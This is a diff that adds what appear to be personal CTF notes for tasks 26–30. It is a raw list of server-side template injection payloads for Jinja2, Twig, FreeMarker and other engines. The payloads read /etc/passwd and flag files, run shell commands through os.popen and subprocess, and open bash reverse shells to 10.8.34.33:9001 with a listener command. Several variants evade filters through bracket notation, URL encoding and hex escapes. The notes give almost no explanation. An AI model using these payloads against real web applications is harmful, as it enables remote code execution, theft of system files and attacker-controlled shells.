@@ -1,0 +1,103 @@
+
+{{7*'7'}}
+task 26
+{{''.__class__.__mro__[2].__subclasses__() }}
+#''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ joiner.__init__.__globals__.os.popen('dir -a').read() }}
+{{ joiner.__init__.__globals__.os.popen('find / | grep flag').read() }}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/root/flag').read() }}
+
+request["__class__"]
+
+nc -lvnp 9001
+{{ joiner.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'").read() }}
+
+task 27
+
+{{''.__class__.__mro__[1].__subclasses__()[280]('find / | grep flag', shell=True, stdout=-1).communicate()}}
+{{''.__class__.__mro__[1].__subclasses__()[280]('cat /root/flag', shell=True, stdout=-1).communicate()}}
+
+task 28
+hint: Delete style in head (it hides secret input)
+and then use dir -a
+{{self}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+
+task 29
+{{7*'7'}}
+<%=7*7%>
+a{*comment*}b
+${"z".join("ab")}
+
+python 2
+
+{{ joiner.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'").read() }}
+
+{{
+python3 
+
+{{''.__class__.__mro__[1].__subclasses__()[280]("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'", shell=True, stdout=-1).communicate()}}
+
+Twig
+
+{{self}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'")}}
+
+Java
+
+"freemarker.template.utility.execute"?new()>${ex("bash -c 'bash -i >& /dev/tcp/10.8.34.33/9001 0>&1'")}
+
+
+30
+
+https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f
+
+
+
+
+{{request.environ}}
+
+{{url_for.__globals__}}
+
+{{url_for.__globals__.current_app}}
+
+{{url_for.__globals__.current_app.config}}
+
+
+
+
+
+traSH:
+
+{{namespace.__init__.__globals__}}
+
+{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__["sys"].modules["os"].popen().read()}}
+
+{{''.__class__.__bases__[0].__subclasses__()}}
+
+10.8.32.1:42792/new/{{ "foo".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open'](%27id%27).read()}}
+
+
+
+http://10.8.32.1:42793/new/%7B%7B%20''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__.__builtins__.open().read()}}
+
+
+{{%27%27[%27__class__%27].__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read() }}
+{{''["__class__"].__mro__[1].__subclasses__()[280]('find / | grep flag', shell=True, stdout=-1).communicate()}}
+request["__class__"]
+
+did not work
+{{['\x63\x6F\x6E\x66\x69\x67']['items']['\x28\x29']}}
+{{config.items()}}
+
+{{''["__class__"].__mro__[2].__subclasses__() }}
+
+{{ joiner["__init__"]["__globals__"]["os"]["popen"]('dir -a')["read"]() }}
+
+{{ ''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__}}
+
+{{ ''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__.__builtins__}}
+{{ ''['__class__'].__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+
